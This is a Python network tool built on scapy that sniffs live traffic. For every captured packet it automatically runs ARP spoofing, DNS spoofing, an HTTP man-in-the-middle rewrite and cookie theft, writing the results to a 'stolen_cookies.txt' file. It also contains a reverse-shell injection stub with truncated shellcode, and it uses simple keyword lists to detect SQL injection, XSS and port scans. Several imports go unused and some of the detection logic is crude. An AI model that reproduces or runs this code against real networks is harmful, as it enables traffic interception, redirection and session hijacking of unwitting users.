import scapy.all as scapy
import psutil
from prettytable import PrettyTable
import re
import time
import threading
from colorama import Fore, Style
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.l2 import ARP
from scapy.all import Raw
import sqlite3
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from datetime import datetime
import pyshark

# Database setup for storing packets
def setup_database():
    conn = sqlite3.connect("packets.db", check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS packets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            source_ip TEXT,
            destination_ip TEXT,
            protocol TEXT,
            summary TEXT
        )
    """)
    conn.commit()
    return conn

# Function to get the current MAC address of the system.
def get_current_mac(interface):
    try:
        addrs = psutil.net_if_addrs()
        mac = addrs[interface][0].address if interface in addrs else None
        return mac if mac and re.match(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", mac) else "No MAC assigned"
    except Exception as e:
        print(f"{Fore.RED}[!] Error getting MAC address: {e}{Style.RESET_ALL}")
        return "No MAC assigned"

# Function to get the current IP address of the system.
def get_current_ip(interface):
    try:
        addrs = psutil.net_if_addrs()
        for addr in addrs.get(interface, []):
            if addr.family.name == 'AF_INET':
                return addr.address
        return "No IP assigned"
    except Exception as e:
        print(f"{Fore.RED}[!] Error getting IP address: {e}{Style.RESET_ALL}")
        return "No IP assigned"

# Function to display the IP and MAC table.
def ip_table():
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f"{Fore.GREEN}Interface", "MAC Address", f"IP Address{Style.RESET_ALL}"])
    for interface, details in addrs.items():
        mac = get_current_mac(interface)
        ip = get_current_ip(interface)
        t.add_row([interface, mac, ip])
    print(t)

# Sniffing and Attack functions
def arp_spoofing(pk):
    if pk.haslayer(ARP) and pk[ARP].op == 1:
        spoofed_arp = ARP(op=2, hwsrc="11:22:33:44:55:66", psrc=pk[ARP].pdst, hwdst=pk[ARP].hwsrc, pdst=pk[ARP].psrc)
        scapy.send(spoofed_arp, verbose=0)
        print(f"ARP Spoofing: Spoofed {pk[ARP].psrc}")

def dns_spoofing(pk):
    if pk.haslayer(DNS) and pk[DNS].qr == 0:
        victim_ip = pk[IP].src
        fake_dns_response = IP(dst=victim_ip, src=pk[IP].dst) / \
                             UDP(dport=pk[UDP].sport, sport=pk[UDP].dport) / \
                             DNS(id=pk[DNS].id, qr=1, aa=1, qd=pk[DNS].qd, an=DNSRR(rrname=pk[DNS].qd.qname, ttl=10, rdata="1.2.3.4"))
        scapy.send(fake_dns_response, verbose=0)
        print(f"DNS Spoofing: Redirected {pk[DNS].qd.qname} to 1.2.3.4")

def mitm_attack(pk):
    try:
        if pk.haslayer(TCP) and pk.haslayer(Raw):
            raw_data = pk[Raw].load.decode(errors='ignore')
            if "HTTP" in raw_data:
                print("MITM Attack: Intercepted HTTP data.")
                modified_data = raw_data.replace("OriginalContent", "ModifiedContent")
                new_pkt = IP(src=pk[IP].dst, dst=pk[IP].src) / TCP(sport=pk[TCP].dport, dport=pk[TCP].sport) / Raw(load=modified_data)
                scapy.send(new_pkt, verbose=0)
    except Exception as e:
        print(f"Error in MITM attack: {e}")

def inject_reverse_shell(pk):
    if pk.haslayer(TCP) and pk.haslayer(Raw):
        raw_data = pk[Raw].load
        if b"HTTP" in raw_data:
            reverse_shell_payload = b"\x31\xdb\xbb\x0b\xba\x01\x89\xe1..."
            new_pkt = IP(src=pk[IP].dst, dst=pk[IP].src) / TCP(sport=pk[TCP].dport, dport=pk[TCP].sport, flags="A") / Raw(load=reverse_shell_payload)
            scapy.send(new_pkt, verbose=0)

def steal_cookies_and_sessions(pk):
    if pk.haslayer(HTTPRequest) and pk.haslayer(Raw):
        raw_data = pk[Raw].load.decode(errors='ignore')
        if "Cookie:" in raw_data:
            cookies = [line for line in raw_data.split("\r\n") if "Cookie:" in line]
            if cookies:
                print(f"Cookies Captured: {cookies}")
                with open("stolen_cookies.txt", "a") as f:
                    f.write(f"Captured at {datetime.now()} - {cookies}\n")

# Using pyshark to analyze TLS/SSL
def capture_tls_traffic(interface):
    try:
        capture = pyshark.LiveCapture(interface=interface, display_filter='tls')
        print(f"Starting TLS capture on interface {interface}...")
        for packet in capture.sniff_continuously(packet_count=10):
            if 'TLS' in packet:
                print(f"Captured TLS packet from {packet.ip.src} to {packet.ip.dst}")
                print(packet.tls)
    except Exception as e:
        print(f"Error capturing TLS traffic: {e}")

def port_scanning(pk):
    if pk.haslayer(TCP):
        if pk[TCP].flags == "S":
            print(f"Port Scanning Detected: {pk[IP].src} is scanning port {pk[TCP].dport}")

def detect_sql_injection(pk):
    if pk.haslayer(Raw):
        raw_data = pk[Raw].load.decode(errors='ignore').lower()
        sql_keywords = ['select', 'union', 'insert', 'drop', '--', ';--', 'or', 'and', '1=1']
        if any(keyword in raw_data for keyword in sql_keywords):
            print(f"Potential SQL Injection Attempt Detected: {raw_data}")
            with open("sql_injection_log.txt", "a") as f:
                f.write(f"Detected at {datetime.now()} - {raw_data}\n")

def detect_xss(pk):
    if pk.haslayer(Raw):
        raw_data = pk[Raw].load.decode(errors='ignore').lower()
        xss_patterns = ['<script>', '</script>', 'alert(', 'onerror=', 'javascript:']
        if any(pattern in raw_data for pattern in xss_patterns):
            print(f"Potential XSS Attempt Detected: {raw_data}")
            with open("xss_log.txt", "a") as f:
                f.write(f"Detected at {datetime.now()} - {raw_data}\n")

# Packet processing function
def process_packet(packet):
    try:
        # Decode raw data using UTF-8, ignoring errors
        if packet.haslayer(Raw):
            raw_data = packet[Raw].load.decode('utf-8', errors='ignore')
        else:
            raw_data = None

        # Example: Print packet details
        print(f"Packet from {packet[IP].src} to {packet[IP].dst}, Protocol: {packet.proto}")

        # Call attack detection functions
        arp_spoofing(packet)
        dns_spoofing(packet)
        mitm_attack(packet)
        steal_cookies_and_sessions(packet)
        detect_sql_injection(packet)
        detect_xss(packet)
        port_scanning(packet)

    except Exception as e:
        print(f"Error processing packet: {e}")

# Start sniffing packets
def start_sniffing(interface):
    try:
        scapy.sniff(iface=interface, prn=process_packet, store=False)
    except Exception as e:
        print(f"Sniffing error: {e}")

# Main function
if __name__ == "__main__":
    # Setup database
    db_conn = setup_database()

    # Display network interfaces
    ip_table()

    # Select interface for sniffing
    available_interfaces = list(psutil.net_if_addrs().keys())
    print("Available network interfaces:")
    for i, iface in enumerate(available_interfaces):
        print(f"{i + 1}. {iface}")
    choice = int(input("Select an interface by number: ")) - 1
    selected_iface = available_interfaces[choice]

    # Start sniffing
    print(f"Starting packet capture on interface {selected_iface}...")
    start_sniffing(selected_iface)